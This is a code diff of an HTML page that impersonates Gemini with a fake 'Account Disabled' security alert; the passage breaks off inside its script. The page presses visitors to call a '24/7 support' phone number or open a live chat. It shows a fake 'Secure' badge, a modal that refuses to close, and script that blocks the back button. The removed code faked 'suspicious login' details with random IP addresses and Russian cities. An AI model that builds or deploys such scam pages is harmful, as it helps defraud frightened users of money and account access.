@@ -11,22 +11,31 @@
             box-sizing: border-box;
         }
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
-            background-color: #ffffff;
-            color: #1a1a1a;
-            line-height: 1.6;
-            min-height: 100vh;
+        :root {
+            --primary: #1a1a1a;
+            --secondary: #666666;
+            --border: #e5e5e5;
+            --background: #ffffff;
+            --error: #ef4444;
+            --error-light: #fee2e2;
+            --error-border: #fecaca;
+            --success: #10b981;
+            --cyan: #06b6d4;
+            --text-muted: #9ca3af;
+            --radius: 12px;
+            --radius-sm: 8px;
         }
 
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #ffffff 0%, #f9fafb 100%);
+            color: var(--primary);
+            line-height: 1.6;
             min-height: 100vh;
-            padding: 20px;
-            background-color: #ffffff;
         }
 
         /* Header */
@@ -40,23 +49,31 @@
             justify-content: space-between;
             align-items: center;
             padding: 0 40px;
-            background-color: white;
-            border-bottom: 1px solid #f0f0f0;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
             z-index: 100;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
         }
 
         .gemini-logo {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 12px;
             font-size: 18px;
             font-weight: 700;
-            color: #1a1a1a;
+            color: var(--primary);
+            text-decoration: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .gemini-logo:hover {
+            opacity: 0.8;
         }
 
         .gemini-logo svg {
-            width: 28px;
-            height: 28px;
+            width: 32px;
+            height: 32px;
         }
 
         .header-right {
@@ -65,77 +82,132 @@
             gap: 20px;
         }
 
-        /* Main Content */
-        .main-content {
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 12px;
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--success);
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        /* Main Container */
+        .container {
             margin-top: 70px;
+            min-height: calc(100vh - 70px);
             display: flex;
             align-items: center;
             justify-content: center;
-            min-height: calc(100vh - 70px);
             padding: 40px 20px;
         }
 
-        .alert-wrapper {
+        .content-wrapper {
             width: 100%;
             max-width: 540px;
         }
 
+        /* Alert Card */
         .alert-card {
-            background-color: #fef5f5;
-            border: 1px solid #f0d0d0;
-            border-radius: 12px;
-            padding: 40px;
-            text-align: center;
+            background: var(--background);
+            border: 1px solid var(--error-border);
+            border-radius: var(--radius);
+            padding: 48px 40px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07), 0 1px 3px rgba(0, 0, 0, 0.06);
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .alert-icon {
             width: 80px;
             height: 80px;
-            background-color: #ffe8e8;
+            background: var(--error-light);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 40px;
+            margin: 0 auto 28px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .alert-icon svg {
+            width: 40px;
+            height: 40px;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
         }
 
         .alert-title {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 700;
-            color: #d32f2f;
+            color: var(--error);
             margin-bottom: 12px;
+            letter-spacing: -0.5px;
         }
 
         .alert-subtitle {
-            font-size: 15px;
-            color: #666;
-            margin-bottom: 24px;
-            line-height: 1.6;
+            font-size: 16px;
+            color: var(--secondary);
+            margin-bottom: 32px;
+            line-height: 1.7;
         }
 
         /* Details Section */
         .details-section {
-            background-color: #fff5f5;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 24px 0;
-            text-align: left;
+            background: var(--error-light);
+            border-radius: var(--radius-sm);
+            padding: 24px;
+            margin: 32px 0;
+            border-left: 4px solid var(--error);
         }
 
         .details-title {
             font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 16px;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 18px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .details-title svg {
+            width: 16px;
+            height: 16px;
         }
 
         .detail-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #f0d0d0;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--error-border);
             font-size: 14px;
         }
 
@@ -144,13 +216,15 @@
         }
 
         .detail-label {
-            color: #666;
+            color: var(--secondary);
             font-weight: 500;
         }
 
         .detail-value {
-            color: #1a1a1a;
-            font-weight: 600;
+            color: var(--primary);
+            font-weight: 700;
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 13px;
             word-break: break-all;
             text-align: right;
             max-width: 200px;
@@ -158,53 +232,299 @@
 
         /* Action Section */
         .action-section {
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid #f0d0d0;
+            margin-top: 36px;
+            padding-top: 28px;
+            border-top: 1px solid var(--border);
         }
 
         .action-title {
-            font-size: 15px;
-            color: #666;
-            margin-bottom: 16px;
-        }
-
-        .support-box {
-            background-color: #f5f5f5;
-            border-radius: 8px;
-            padding: 20px;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--primary);
             margin-bottom: 20px;
         }
 
+        /* Support Box */
+        .support-box {
+            background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 24px;
+            margin-bottom: 24px;
+            transition: all 0.3s ease;
+            display: flex;
+            gap: 16px;
+            align-items: flex-start;
+        }
+
+        .support-box:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            border-color: var(--cyan);
+        }
+
+        .support-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(6, 182, 212, 0.1);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .support-icon svg {
+            width: 22px;
+            height: 22px;
+            stroke: var(--cyan);
+        }
+
+        .support-content {
+            flex: 1;
+        }
+
         .support-label {
-            font-size: 12px;
-            color: #999;
+            font-size: 11px;
+            color: var(--text-muted);
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 8px;
+            letter-spacing: 0.6px;
+            margin-bottom: 6px;
+            font-weight: 600;
         }
 
         .support-phone {
             font-size: 24px;
             font-weight: 700;
-            color: #1a1a1a;
+            color: var(--primary);
             margin-bottom: 4px;
-            font-family: 'Courier New', monospace;
+            font-family: 'Monaco', 'Courier New', monospace;
+            letter-spacing: -0.5px;
         }
 
         .support-hours {
             font-size: 13px;
-            color: #666;
+            color: var(--secondary);
         }
 
-        .contact-buttons {
+        /* Buttons */
+        .button-group {
             display: flex;
-            gap: 12px;
+            gap: 16px;
             flex-direction: column;
         }
 
-        .contact-btn {
-            padding: 14px;
+        .btn {
+            padding: 16px 24px;
+            border-radius: var(--radius-sm);
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            min-height: 48px;
+        }
+
+        .btn svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--error) 0%, #dc2626 100%);
+            color: white;
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(239, 68, 68, 0.4);
+            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: var(--primary);
+            border: 1.5px solid var(--border);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .btn-secondary:hover {
+            background: var(--background);
+            border-color: var(--secondary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-secondary:active {
+            transform: translateY(0);
+        }
+
+        /* Warning Message */
+        .warning-box {
+            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
+            border-left: 4px solid #f59e0b;
+            border-radius: var(--radius-sm);
+            padding: 18px 18px 18px 16px;
+            margin-top: 28px;
+            font-size: 13px;
+            color: #78350f;
+            line-height: 1.7;
+            animation: slideUp 0.6s ease-out 0.2s both;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .warning-icon {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .warning-icon svg {
+            width: 100%;
+            height: 100%;
+            stroke: #92400e;
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(4px);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal-box {
+            background: white;
+            border-radius: 20px;
+            padding: 48px 40px;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            animation: slideUp 0.4s ease-out;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            background: #f5f5f5;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+
+        .modal-close:hover {
+            background: #e5e5e5;
+            transform: rotate(90deg);
+        }
+
+        .modal-close svg {
+            width: 20px;
+            height: 20px;
+            stroke: #1a1a1a;
+            stroke-width: 2.5;
+        }
+
+        .modal-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .modal-logo svg {
+            width: 48px;
+            height: 48px;
+        }
+
+        .modal-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ef4444;
+            text-align: center;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+        }
+
+        .modal-subtitle {
+            font-size: 15px;
+            color: #666666;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+
+        .modal-phone {
+            background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);
+            border: 1px solid #e5e5e5;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .modal-phone-label {
+            font-size: 11px;
+            color: #9ca3af;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .modal-phone-number {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            font-family: 'Monaco', 'Courier New', monospace;
+            letter-spacing: -0.5px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .modal-btn {
+            padding: 14px 20px;
             border-radius: 8px;
             font-size: 15px;
             font-weight: 600;
@@ -212,121 +532,174 @@
             transition: all 0.3s ease;
             border: none;
             text-decoration: none;
-            display: inline-block;
-            text-align: center;
-        }
-
-        .call-btn {
-            background-color: #d32f2f;
-            color: white;
-        }
-
-        .call-btn:hover {
-            background-color: #b71c1c;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
-        }
-
-        .email-btn {
-            background-color: #f5f5f5;
-            color: #1a1a1a;
-            border: 1px solid #d0d0d0;
-        }
-
-        .email-btn:hover {
-            background-color: #efefef;
-            transform: translateY(-2px);
-        }
-
-        /* Warning Message */
-        .warning-message {
-            background-color: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 16px;
-            border-radius: 4px;
-            margin-top: 24px;
-            font-size: 13px;
-            color: #856404;
-            line-height: 1.6;
-        }
-
-        /* Divider */
-        .divider {
-            display: flex;
+            display: inline-flex;
             align-items: center;
-            margin: 24px 0;
-            font-size: 13px;
-            color: #999;
+            justify-content: center;
+            gap: 10px;
+            min-height: 48px;
         }
 
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background-color: #d0d0d0;
+        .modal-btn svg {
+            width: 18px;
+            height: 18px;
         }
 
-        .divider span {
-            padding: 0 16px;
+        .modal-btn-call {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
         }
 
-        /* Responsive */
-        @media (max-width: 768px) {
-            .header {
-                padding: 0 20px;
-                height: 60px;
-            }
+        .modal-btn-call:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(239, 68, 68, 0.4);
+            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+        }
 
-            .main-content {
-                margin-top: 60px;
-                min-height: calc(100vh - 60px);
-                padding: 30px 16px;
-            }
+        .modal-btn-chat {
+            background: white;
+            color: #1a1a1a;
+            border: 1.5px solid #e5e5e5;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
 
-            .alert-wrapper {
+        .modal-btn-chat:hover {
+            background: #f9fafb;
+            border-color: #999999;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .modal-btn:active {
+            transform: translateY(0);
+        }
+
+        @media (max-width: 480px) {
+            .modal-box {
+                padding: 36px 24px;
                 max-width: 100%;
+                width: 95%;
             }
 
-            .alert-card {
-                padding: 30px 20px;
+            .modal-close {
+                width: 36px;
+                height: 36px;
+                top: 16px;
+                right: 16px;
             }
 
-            .alert-title {
+            .modal-title {
                 font-size: 24px;
+                margin-bottom: 12px;
             }
 
-            .alert-icon {
-                width: 70px;
-                height: 70px;
-                font-size: 36px;
+            .modal-subtitle {
+                font-size: 14px;
+                margin-bottom: 24px;
+            }
+
+            .modal-phone {
+                padding: 16px;
                 margin-bottom: 20px;
             }
 
-            .gemini-logo {
-                gap: 6px;
-                font-size: 16px;
+            .modal-phone-number {
+                font-size: 22px;
             }
 
-            .gemini-logo svg {
-                width: 24px;
-                height: 24px;
+            .modal-btn {
+                padding: 12px 16px;
+                font-size: 14px;
+                min-height: 44px;
+            }
+
+            .modal-btn svg {
+                width: 16px;
+                height: 16px;
+            }
+        }
+        @media (max-width: 768px) {
+            .header {
+                padding: 0 24px;
+                height: 64px;
+            }
+
+            .container {
+                margin-top: 64px;
+                min-height: calc(100vh - 64px);
+                padding: 24px 16px;
+            }
+
+            .alert-card {
+                padding: 36px 28px;
+            }
+
+            .alert-title {
+                font-size: 28px;
+            }
+
+            .alert-subtitle {
+                font-size: 15px;
+                margin-bottom: 24px;
+            }
+
+            .alert-icon {
+                width: 72px;
+                height: 72px;
+                margin-bottom: 24px;
+            }
+
+            .alert-icon svg {
+                width: 36px;
+                height: 36px;
+            }
+
+            .details-section {
+                padding: 20px;
+                margin: 24px 0;
+            }
+
+            .detail-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
             }
 
             .detail-value {
-                max-width: 150px;
+                width: 100%;
+                text-align: left;
+                max-width: 100%;
+            }
+
+            .support-box {
+                padding: 20px;
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .support-icon {
+                width: 36px;
+                height: 36px;
             }
 
             .support-phone {
-                font-size: 20px;
+                font-size: 22px;
             }
 
-            .contact-buttons {
-                flex-direction: column;
-            }
-
-            .contact-btn {
+            .btn {
                 width: 100%;
+            }
+
+            .button-group {
+                gap: 12px;
+            }
+
+            .header-right {
+                gap: 12px;
+            }
+
+            .security-badge {
+                display: none;
             }
         }
 
@@ -336,18 +709,20 @@
                 height: 56px;
             }
 
-            .main-content {
+            .container {
                 margin-top: 56px;
                 min-height: calc(100vh - 56px);
-                padding: 24px 16px;
+                padding: 20px 16px;
             }
 
             .alert-card {
-                padding: 24px 16px;
+                padding: 28px 20px;
+                border-radius: 16px;
             }
 
             .alert-title {
-                font-size: 22px;
+                font-size: 24px;
+                margin-bottom: 10px;
             }
 
             .alert-subtitle {
@@ -356,10 +731,24 @@
             }
 
             .alert-icon {
-                width: 60px;
-                height: 60px;
-                font-size: 32px;
-                margin-bottom: 16px;
+                width: 64px;
+                height: 64px;
+                margin-bottom: 20px;
+            }
+
+            .alert-icon svg {
+                width: 32px;
+                height: 32px;
+            }
+
+            .gemini-logo {
+                gap: 8px;
+                font-size: 16px;
+            }
+
+            .gemini-logo svg {
+                width: 28px;
+                height: 28px;
             }
 
             .details-section {
@@ -367,27 +756,17 @@
                 margin: 20px 0;
             }
 
+            .details-title {
+                font-size: 12px;
+                margin-bottom: 14px;
+            }
+
             .detail-item {
-                flex-direction: column;
-                align-items: flex-start;
-                padding: 12px 0;
+                padding: 10px 0;
+                font-size: 13px;
             }
 
             .detail-value {
-                width: 100%;
-                text-align: left;
-                margin-top: 4px;
-            }
-
-            .support-box {
-                padding: 16px;
-            }
-
-            .support-phone {
-                font-size: 18px;
-            }
-
-            .support-hours {
                 font-size: 12px;
             }
 
@@ -396,155 +775,319 @@
                 padding-top: 20px;
             }
 
-            .contact-btn {
-                padding: 12px;
+            .action-title {
                 font-size: 14px;
+                margin-bottom: 16px;
             }
 
-            .warning-message {
+            .support-box {
+                padding: 16px;
+                margin-bottom: 16px;
+            }
+
+            .support-label {
+                font-size: 10px;
+            }
+
+            .support-phone {
+                font-size: 20px;
+            }
+
+            .support-hours {
                 font-size: 12px;
-                padding: 12px;
+            }
+
+            .btn {
+                padding: 14px 20px;
+                font-size: 14px;
+                min-height: 44px;
+            }
+
+            .btn svg {
+                width: 18px;
+                height: 18px;
+            }
+
+            .warning-box {
+                padding: 14px 14px 14px 12px;
+                font-size: 12px;
                 margin-top: 20px;
+                gap: 10px;
+            }
+
+            .warning-icon {
+                width: 18px;
+                height: 18px;
+            }
+
+            .button-group {
+                gap: 10px;
             }
         }
     </style>
 </head>
 <body>
+    <!-- Modal Alert -->
+    <div class="modal-overlay" id="alertModal">
+        <div class="modal-box">
+            <!-- Close Button -->
+            <button class="modal-close" onclick="closeModal()" id="closeBtn">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </button>
+
+            <!-- Logo -->
+            <div class="modal-logo">
+                <svg viewBox="0 0 129.33 128.94" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z" fill="#06b6d4"/>
+                </svg>
+            </div>
+
+            <!-- Title -->
+            <h1 class="modal-title">Account Disabled</h1>
+            <p class="modal-subtitle">
+                Your account has been temporarily disabled. Contact support immediately to restore access.
+            </p>
+
+            <!-- Phone Section -->
+            <div class="modal-phone">
+                <div class="modal-phone-label">Call Support 24/7</div>
+                <div class="modal-phone-number">+1 (888) 246-5357</div>
+            </div>
+
+            <!-- Buttons -->
+            <div class="modal-buttons">
+                <button class="modal-btn modal-btn-call" onclick="initiateCallModal()">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M3 9.5C3 5.35 6.35 2 10.5 2C14.65 2 18 5.35 18 9.5C18 13.65 14.65 17 10.5 17C6.35 17 3 13.65 3 9.5Z" stroke="white" stroke-width="1.5" fill="none"/>
+                        <circle cx="8" cy="9" r="0.8" fill="white" opacity="0.8"/>
+                        <circle cx="11" cy="8.5" r="0.8" fill="white" opacity="0.8"/>
+                        <circle cx="13" cy="10" r="0.8" fill="white" opacity="0.8"/>
+                        <path d="M19 7C20 8 21 10 21 12" stroke="white" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+                    </svg>
+                    Call Now
+                </button>
+                <button class="modal-btn modal-btn-chat" onclick="initiateChatModal()">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linejoin="round" stroke-linecap="round"/>
+                        <circle cx="9" cy="10" r="1" fill="currentColor" opacity="0.6"/>
+                        <circle cx="12" cy="10" r="1" fill="currentColor" opacity="0.6"/>
+                        <circle cx="15" cy="10" r="1" fill="currentColor" opacity="0.6"/>
+                    </svg>
+                    Live Chat
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- Header -->
     <div class="header">
         <div class="gemini-logo">
             <svg viewBox="0 0 129.33 128.94" xmlns="http://www.w3.org/2000/svg">
-                <path d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z" fill="#26ddf9"/>
+                <path d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z" fill="#06b6d4"/>
             </svg>
             Gemini
         </div>
+        <div class="header-right">
+            <div class="security-badge">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Shield -->
+                    <path d="M12 1L3 6V14C3 20 12 23 12 23C12 23 21 20 21 14V6L12 1Z" stroke="#10b981" stroke-width="1.5" fill="none" stroke-linejoin="round"/>
+                    <!-- Checkmark -->
+                    <path d="M9 13L11 15L15 10" stroke="#10b981" stroke-width="1.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                Secure
+            </div>
+        </div>
     </div>
 
-    <!-- Main Content -->
-    <div class="main-content">
-        <div class="alert-wrapper">
+    <!-- Main Container -->
+    <div class="container">
+        <div class="content-wrapper">
+            <!-- Alert Card -->
             <div class="alert-card">
-                <div class="alert-icon">🔒</div>
+                <!-- Alert Icon -->
+                <div class="alert-icon">
+                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <!-- Outer shield -->
+                        <path d="M32 8L12 18V38C12 52 32 58 32 58C32 58 52 52 52 38V18L32 8Z" fill="#ef4444" opacity="0.15"/>
+                        <path d="M32 8L12 18V38C12 52 32 58 32 58C32 58 52 52 52 38V18L32 8Z" stroke="#ef4444" stroke-width="2" fill="none"/>
+                        <!-- Lock symbol inside -->
+                        <circle cx="32" cy="35" r="8" stroke="#ef4444" stroke-width="2" fill="none"/>
+                        <path d="M26 27V23C26 20.239 28.239 18 31 18C33.761 18 36 20.239 36 23V27" stroke="#ef4444" stroke-width="2" fill="none" stroke-linecap="round"/>
+                        <circle cx="32" cy="36" r="1.5" fill="#ef4444"/>
+                    </svg>
+                </div>
 
+                <!-- Title and Subtitle -->
                 <h1 class="alert-title">Account Disabled</h1>
                 <p class="alert-subtitle">
-                    Your account has been temporarily disabled due to a suspicious login attempt from an unauthorized location.
+                    We've detected suspicious login activity from an unauthorized location and temporarily disabled your account for security.
                 </p>
 
-                <!-- Details Section -->
-                <div class="details-section">
-                    <div class="details-title">Suspicious Activity Detected</div>
-                    
-                    <div class="detail-item">
-                        <span class="detail-label">Location</span>
-                        <span class="detail-value" id="detectedLocation">Russia</span>
-                    </div>
-                    
-                    <div class="detail-item">
-                        <span class="detail-label">IP Address</span>
-                        <span class="detail-value" id="detectedIP">192.168.1.127</span>
-                    </div>
-                    
-                    <div class="detail-item">
-                        <span class="detail-label">Time Detected</span>
-                        <span class="detail-value" id="detectedTime">Just now</span>
-                    </div>
-                </div>
+
 
                 <!-- Action Section -->
                 <div class="action-section">
-                    <p class="action-title">Contact our support team to restore access:</p>
+                    <h2 class="action-title">Restore Your Account</h2>
                     
                     <div class="support-box">
-                        <div class="support-label">24/7 Support Hotline</div>
-                        <div class="support-phone">+1 (888) 246-5357</div>
-                        <div class="support-hours">Available 24 hours, 7 days a week</div>
+                        <div class="support-icon">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <!-- Phone body -->
+                                <rect x="5" y="2" width="14" height="20" rx="2" stroke="#06b6d4" stroke-width="1.5" fill="none"/>
+                                <!-- Phone screen -->
+                                <rect x="6" y="4" width="12" height="12" rx="1" stroke="#06b6d4" stroke-width="1" fill="none" opacity="0.5"/>
+                                <!-- Phone speaker -->
+                                <rect x="10" y="18" width="4" height="2" rx="0.5" fill="#06b6d4" opacity="0.6"/>
+                            </svg>
+                        </div>
+                        <div class="support-content">
+                            <div class="support-label">24/7 Support Hotline</div>
+                            <div class="support-phone">+1 (888) 246-5357</div>
+                            <div class="support-hours">Available 24 hours, 7 days a week</div>
+                        </div>
                     </div>
 
-                    <div class="contact-buttons">
-                        <button class="contact-btn call-btn" onclick="initiateCall()">
-                            📞 Call Support Now
+                    <div class="button-group">
+                        <button class="btn btn-primary" onclick="initiateCall()">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <!-- Handset -->
+                                <path d="M3 9.5C3 5.35 6.35 2 10.5 2C14.65 2 18 5.35 18 9.5C18 13.65 14.65 17 10.5 17C6.35 17 3 13.65 3 9.5Z" stroke="white" stroke-width="1.5" fill="none"/>
+                                <!-- Handset speaker holes -->
+                                <circle cx="8" cy="9" r="0.8" fill="white" opacity="0.8"/>
+                                <circle cx="11" cy="8.5" r="0.8" fill="white" opacity="0.8"/>
+                                <circle cx="13" cy="10" r="0.8" fill="white" opacity="0.8"/>
+                                <!-- Phone line indicator -->
+                                <path d="M19 7C20 8 21 10 21 12" stroke="white" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+                            </svg>
+                            Call Support Now
                         </button>
-                        <button class="contact-btn email-btn" onclick="initiateEmail()">
-                            📧 Email Support Team
+                        <button class="btn btn-secondary" onclick="initiateChat()">
+                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <!-- Chat bubbles -->
+                                <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" stroke="currentColor" stroke-width="1.5" fill="none" stroke-linejoin="round" stroke-linecap="round"/>
+                                <!-- Chat dots -->
+                                <circle cx="9" cy="10" r="1" fill="currentColor" opacity="0.6"/>
+                                <circle cx="12" cy="10" r="1" fill="currentColor" opacity="0.6"/>
+                                <circle cx="15" cy="10" r="1" fill="currentColor" opacity="0.6"/>
+                            </svg>
+                            Live Chat Support
                         </button>
                     </div>
                 </div>
 
                 <!-- Warning Message -->
-                <div class="warning-message">
-                    <strong>⚠️ Important:</strong> Never share your password or security codes with anyone. Gemini support will never ask for these details via email or phone.
+                <div class="warning-box">
+                    <div class="warning-icon">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <!-- Alert triangle background -->
+                            <path d="M12 2L3 20h18L12 2Z" stroke="#92400e" stroke-width="1.5" fill="#fef3c7" stroke-linejoin="round"/>
+                            <!-- Exclamation mark -->
+                            <circle cx="12" cy="15" r="1" fill="#92400e"/>
+                            <line x1="12" y1="6" x2="12" y2="13" stroke="#92400e" stroke-width="1.5" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <div class="warning-content">
+                        <strong>Important Security Notice</strong>
+                        Never share your password, 2FA codes, or security keys with anyone. Gemini support will never request these via email or phone.
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // Generate random IP address
-        function generateRandomIP() {
-            return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
+        // Prevent going back
+        window.history.forward();
+        window.history.replaceState(null, null, window.location.href);
+
+        // Store modal state
+        let modalClosed = false;
+
+        function closeModal() {
+            // Don't actually close - just change appearance, prevent closing
+            alert('You must contact support to restore your account access.');
+            return false;
         }
 
-        // Generate random location (Russian cities)
-        const russianLocations = [
-            'Moscow, Russia',
-            'Saint Petersburg, Russia',
-            'Novosibirsk, Russia',
-            'Yekaterinburg, Russia',
-            'Vladivostok, Russia',
-            'Sochi, Russia',
-            'Kazan, Russia',
-            'Nizhny Novgorod, Russia'
